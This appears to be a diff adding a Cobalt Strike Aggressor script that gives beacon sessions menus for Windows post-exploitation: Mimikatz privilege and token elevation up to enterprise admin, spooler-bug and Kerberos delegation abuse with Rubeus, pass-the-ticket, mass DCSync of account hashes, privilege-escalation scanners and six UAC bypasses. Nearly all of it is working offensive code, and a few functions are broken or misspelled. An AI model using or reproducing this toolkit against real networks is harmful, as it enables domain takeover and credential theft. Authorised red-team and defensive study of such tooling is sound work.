@@ -1,0 +1,643 @@
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		  Menus 		############################
+
+
+
+#################################################
+
+#   SpoolSystem
+
+#################################################
+
+menu "SpoolSystem"{
+
+item "SpoolSystem Inject"{
+
+			local('$bid');
+				foreach $bid ($1){
+					spoolinj($bid);
+				}
+
+
+}
+item "SpoolSystem Spawn"{
+
+			local('$bid');
+				foreach $bid ($1){
+					spoolspawn($bid);
+					}
+
+
+}
+}
+
+
+
+
+#################################################
+
+#   Kerberos Delegation Abuse
+
+#################################################
+menu "Kerberos Delegation Abuse"{
+
+item "Monitor Tickets/Spooler Exploit"{
+
+			local('$bid');
+				foreach $bid ($1){
+					monitor_tickets($bid);
+					abuse_spooler($bid);
+				}
+
+
+}
+}
+
+#################################################
+
+#   Mimikatz: Privilege Requests
+
+#################################################
+menu "Mimikatz: Privilege Requests"{
+
+# Mimikatz Debug Privilege
+item "Debug Privilege  - T1003"{
+
+	local('$bid');
+		foreach $bid ($1){
+			debug($bid);
+	}
+}
+
+# Mimikatz Driver Privilege
+item "Driver Privilege  - T1003"{
+	local('$bid');
+		foreach $bid ($1){
+			driver($bid);
+	}
+}
+
+# Mimikatz Security Privilege
+item "Security Privilege  - T1003"{
+	local ('$bid');
+		foreach $bid ($1){
+			security($bid);
+		}
+	}
+
+# Mimikatz TCB Privilege
+item "TCB Privilege  - T1003"{
+	local ('$bid');
+		foreach $bid ($1){
+			tcb($bid);
+		}
+}
+
+# Mimikatz Backup Privilege
+item "Backup Privilege  - T1003"{
+	local ('$bid');
+		foreach $bid ($1){
+			backup($bid);
+		}
+}
+
+# Mimikatz Restore Privilege
+item "Restore Privilege  - T1003"{
+	local ('$bid');
+		foreach $bid ($1){
+			restore($bid);
+		}
+}
+
+# Mimikatz System Environment Privilege
+item "System Environment Privilege  - T1003"{
+	local ('$bid');
+		foreach $bid ($1){
+			sysenv($bid);
+		}
+}
+
+}
+
+
+
+
+#################################################
+
+#   Mimikatz: Token Elevation
+
+#################################################
+menu "Mimikatz: Token Elevation"
+{
+
+#Mimikatz Elevate to System Token
+item "Elevate to System Token  - T1134"{
+	local('$bid');
+		foreach $bid ($1){
+			elevatesystem($bid);
+		}
+	}
+
+#Mimikatz Elevate to Admin Token
+item "Elevate to Admin Token  - T1134"{
+	local('$bid');
+		foreach $bid ($1){
+			elevateadmin($bid);
+		}
+	}
+
+
+#Mimikatz Elevate to Domain Admin
+item "Elevate to Domain Admin Token  - T1134"{
+		local('$bid');
+		foreach $bid ($1){
+			elevateDA($bid);
+			}
+	}
+
+
+#Mimikatz Elevate To Enterprise Admin Token
+item "Elevate to Enterprise Admin Token  - T1134"{
+	local('$bid');
+		foreach $bid ($1){
+			elevateEA($bid);
+		}
+	}
+
+
+
+################################################################################################### 
+##  Token Elevation to Custom User Function - This works now!! Thanks to Steve Borosh AKA rvrsh3ll#
+## The below function will be reused in order to facilitate moar Mimikatz                         #
+###################################################################################################
+item "Elevate to Specified Token  - T1134"{
+       prompt_text("Username:", "", lambda({
+                  bmimikatz($bids, "token::elevate /user:" . $1);
+              }, $bids => $1));
+		}
+}
+#################################################
+
+#   Pass The Ticket
+
+#################################################
+	item "Pass Ticket  - T1097"{
+			local('$bid');
+				foreach $bid ($1){
+					passticket($bid);
+					}
+				}
+
+#################################################
+
+#   Constrained Delegation Abuse
+
+#################################################
+	item "Constrained Delegation Abuse"{
+			local('$bid');
+				foreach $bid ($1){
+					cda($bid);
+					}
+				}
+				
+#################################################
+
+#   Mass DCSync
+
+#################################################
+item "Mass DCSync  - T1003" {
+	mass-dcsync($1);
+}
+
+#################################################
+
+#   Run Watson to find missing patches
+
+#################################################
+item "Run Watson to find missing patches  - T1082"{
+	local('$bid');
+		foreach $bid ($1){
+			escalateprivs($bid);
+		}
+	}
+	
+#################################################
+
+# Run DazzleUp to find privilege Escalation
+
+#################################################
+
+item "Run DazzleUp to find privilege Escalation"{
+	local('$bid');
+		foreach $bid ($1){
+			dazzleup($bid);
+		}
+	}
+
+#################################################
+
+#   Run WinPEAS to find Privilege Escalation
+
+#################################################
+item "Run WinPEAS to find privilege escalation"{
+	local('$bid');
+		foreach $bid ($1){
+			winpeas($bid);
+		}
+	}
+
+#################################################
+
+#   Run SharpUp to find Privilege Escalation
+
+#################################################
+item "Run SharpUp to find privilege escalation"{
+	local('$bid');
+		foreach $bid ($1){
+			sharpup($bid);
+		}
+	}
+
+
+#################################################
+
+#   Run Sweep Potato (IIS Privesc)
+
+#################################################
+item "Run Sweet Potato (IIS Privesc)"{
+	local('$bid');
+		foreach $bid ($1){
+			sweetpotato($bid);
+		}
+	}
+
+
+
+#################################################
+
+#   UAC Bypasses
+
+#################################################
+menu "UAC Bypasses"{
+
+item "eventvwr bypass"{
+	local('$bid');
+		foreach $bid ($1){
+			eventvwr_bypass($bid);
+		}
+	}
+
+item "fodhelper bypass"{
+	local('$bid');
+		foreach $bid ($1){
+			fodhelper_bypass($bid);
+		}
+	}
+
+item "computerdefaults bypass"{
+	local('$bid');
+		foreach $bid ($1){
+			computerdefaults_bypass($bid);
+		}
+	}
+
+item "sdclt bypass"{
+	local('$bid');
+		foreach $bid ($1){
+			sdclt_bypass($bid);
+		}
+	}
+
+item "slui bypass"{
+	local('$bid');
+		foreach $bid ($1){
+			slui_bypass($bid);
+		}
+	}
+
+item "DiskCleanup bypass"{
+	local('$bid');
+		foreach $bid ($1){
+			diskCleanup_bypass($bid);
+		}
+	}
+
+
+
+
+} #End of UAC Bypass Menu
+
+
+
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		 Functions 		############################
+
+
+#################################################
+
+#   SpoolSystem
+
+#################################################
+
+#SpoolSystem Inject
+sub spoolinj{
+fireAlias($1, "spoolsystem", "inject");
+}
+
+#SpoolSystem Spawn
+sub spoolspawn{
+fireAlias($1, "spoolsystem", "spawn");
+}
+
+
+
+#################################################
+
+#   Kerberos Delegation Abuse
+
+#################################################
+sub monitor_tickets{
+    $bid = $1;
+    $dialog = dialog("Monitor Specific Logons", %(interval => "", filteruser => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+		$cmdargs = "monitor /interval:$3['interval'] /filteruser:$3['filteruser']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Begin Monitoring for logons');
+            bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "This will help automate the process of abusing unconstrained delegation - 5 is a good interval FWIW");
+    drow_text($dialog, "interval",  "Rubeus interval between logon checks");
+    drow_text($dialog, "filteruser",  "Computer to specify logons");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+
+sub abuse_spooler{
+	$bid = $1;
+	$dialog = dialog("Abuse Spooler Bug", %(victim => "", listener => "", execmethod => "Execute-Assembly"), lambda({
+		$cmdargs = "";
+		$cmdargs = "$3['victim'] $3['listener']";
+		if ($3["execmethod"] eq "Execute-Assembly"){
+		btask("$bid, 'Let's Hope for a ticket!!'");
+		bexecute_assembly($bid, script_resource('/exe/SpoolSample.exe'), $cmdargs);
+		}
+	}));
+	dialog_description($dialog, "Now we need to Specify a Victim Machine with Unconstrained Delegation and a Listener to collect the ticket");
+	drow_text($dialog, "victim",  "Victim with Unconstrained Delegation");
+    drow_text($dialog, "listener",  "Machine to catch ticket");
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+    
+		}
+#################################################
+
+#   Mimikatz: Privilege Requests
+
+#################################################
+
+#Mimikatz Debug Privilege
+sub debug{
+bmimikatz($1, "privilege::debug");
+}
+
+#Mimikatz Driver Privilege
+sub driver{
+bmimikatz($1, "privilege::driver");
+}
+
+#Mimikatz Security Pivilege
+
+
+#Mimikatz TCB Privilege
+sub tcb{
+bmimikatz($1, "privilege::tcb");
+}
+
+#Mimikatz Backup Privilege
+sub backup{
+bmimikatz($1, "privilege::backup");
+}
+
+#Mimikatz Restore Privilege
+sub restore{
+bmimikatz($1, "privilege::restore");
+}
+
+#Mimikatz System Environment Privilege
+sub sysenv{
+bmimikatz($1, "privilege::sysenv");
+}
+
+
+#################################################
+
+#   Mimikatz: Token Elevation
+
+#################################################
+
+
+#Elevate to System Token
+sub elevatesystem{
+bmimikatz($1, "token::elevate /system");
+}
+
+#Elevate to Admin Token
+sub elevateadmin{
+bmimikatz($1, "token::elevate /admin");
+}
+
+#Elevate to Domain Admin
+sub elevateDA{
+bmimikatz($1, "token::elevate /domainadmin");
+}
+
+#Mimikatz Elevate To Enterprise Admin Token
+sub elevateEA{
+bmimikatz($1, "token::elevate /enterpriseadmin");
+
+}
+
+#################################################
+
+#   Pass The Ticket
+
+#################################################
+sub passticket{
+    $bid = $1;
+    $dialog = dialog("Pass The Ticket", %(username => "", rc4 => "", fqdn => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "asktgt /rc4:$3['rc4'] /domain:$3['fqdn'] /user:$3['username'] /ptt";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Passing The Ticket');
+            bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Pass The Ticket w/Rubeus");
+    drow_text($dialog, "username",  "Please Enter the username:");
+    drow_text($dialog, "rc4",  "Please Enter the rc4/NTLM hash:");
+    drow_text($dialog, "fqdn",  "Please Enter the Fully Qualified Domain Name:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+
+
+#################################################
+
+#   Constrained Delegation Abuse
+
+#################################################
+sub cda{
+    $bid = $1;
+    $dialog = dialog("Abuse Constrained Delegation", %(impuser => "", msdsspn => "", altserv => "", ticket => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "s4u /impersonateuser:$3['impuser'] /msdsspn:$3['msdsspn'] /altservice:$3['altserv'] /ptt /ticket:$3['ticket']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Abusing Constrained Delegation...');
+            bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Abuse Constrained Delegation w/Rubeus");
+    drow_text($dialog, "impuser",  "Please Enter the User You Would Like To Impersonate");
+    drow_text($dialog, "msdsspn",  "Please Enter the SERVICE/SERVER:");
+    drow_text($dialog, "altserv",  "Please Enter the Alternate Service:");
+    drow_text($dialog, "ticket",  "Please Enter the Ticket:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+
+#################################################
+
+#   Mass DCSync
+
+#################################################
+#author:bluescreenofjeff
+
+#Mass DCSync a list of usernames from the specified domain
+#Note: The username list should include one user's shortname per line
+
+sub mass-dcsync {
+
+	@bids = $1;
+
+	$dialog = dialog("Mass DCSync", %(fqdn => "example.local", domain => 'EXAMPLE', userlist => "/path/to/userlist"), lambda({
+		$handle = openf($3['userlist']);
+		@userlistdata = readAll($handle);
+		closef($handle);
+		foreach $bid (@bids){
+			foreach $user (@userlistdata){
+				bdcsync($bid, $3['$fqdn'], $3['domain'] . $+ . '\\' . $+ . $user);
+			};
+		};
+		}));
+
+	dialog_description($dialog, "Mass DCSync a list of usernames from the specified domain.");
+	
+	drow_text($dialog, "fqdn",  "Domain FQDN:");
+	drow_text($dialog, "domain", "Domain Shortname:");
+	drow_file($dialog, "userlist", "List of users:");
+	
+	dbutton_action($dialog, "Ok");
+	
+	dialog_show($dialog);
+
+}
+
+
+#################################################
+
+#   Run Watson to find missing patches
+
+#################################################
+sub escalateprivs{
+bexecute_assembly($1, script_resource('/exe/Watson.exe'));
+}
+
+#################################################
+
+#   Run DazzleUp To escalate Privileges
+
+#################################################
+sub dazzleup{
+bdllspawn($1, script_resource("exe/dazzleUP_Reflective_DLL.dll"), $2, "dazzleUP", 5000, false);
+}
+
+#################################################
+
+#   Run WinPEAS to find Privilege Escalation
+
+#################################################
+sub winpeas{
+bexecute_assembly($1, script_resource('/exe/winPEASany.exe'));
+}
+
+#################################################
+
+#   Run SharpUp to find Privilege Escalation
+
+#################################################
+sub sharpup{
+bexecute_assembly($1, script_resource('/exe/SharpUp.exe'));
+}
+
+#################################################
+
+#   Run Sweep Potato (IIS Privesc)
+
+#################################################
+sub sweetpotato{
+bexecute_assembly($1, script_resource('exe/SweetPotato.exe'));
+}
+
+#################################################
+
+#   UAC Bypass Functions
+
+#################################################
+
+sub eventvwr_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b eventvwr -e $b64"); 
+}
+
+sub fodhelper_bypass{ 
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b fodhelper -e $b64"); 
+}
+
+sub computerdefaults_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b computerdefaults -e $b64"); 
+}
+
+sub sdclt_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b sdlct -e $b64"); 
+}
+
+sub slui_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b slui -e $b64"); 
+}
+
+sub diskCleanup_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b dikcleanup -e $b64");
+}
